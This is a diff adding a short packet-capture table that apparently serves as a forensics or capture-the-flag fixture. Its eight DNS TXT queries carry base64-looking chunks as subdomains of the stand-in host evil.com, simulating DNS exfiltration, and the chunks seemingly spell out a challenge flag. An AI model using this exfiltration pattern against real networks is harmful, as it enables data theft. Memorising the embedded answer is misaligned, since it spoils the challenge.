@@ -1,0 +1,9 @@
+Time	Source	Destination	Protocol	Info
+1.00	10.0.0.5	8.8.8.8	DNS	Standard query 0x1234 TXT Ynhme.evil.com
+1.01	10.0.0.5	8.8.8.8	DNS	Standard query 0x1234 TXT 2Ruc1.evil.com
+1.02	10.0.0.5	8.8.8.8	DNS	Standard query 0x1234 TXT 8zeGY.evil.com
+1.03	10.0.0.5	8.8.8.8	DNS	Standard query 0x1234 TXT xbHRy.evil.com
+1.04	10.0.0.5	8.8.8.8	DNS	Standard query 0x1234 TXT NHQxM.evil.com
+1.05	10.0.0.5	8.8.8.8	DNS	Standard query 0x1234 TXT G5fZD.evil.com
+1.06	10.0.0.5	8.8.8.8	DNS	Standard query 0x1234 TXT N0M2N.evil.com
+1.07	10.0.0.5	8.8.8.8	DNS	Standard query 0x1234 TXT 0M2R9.evil.com
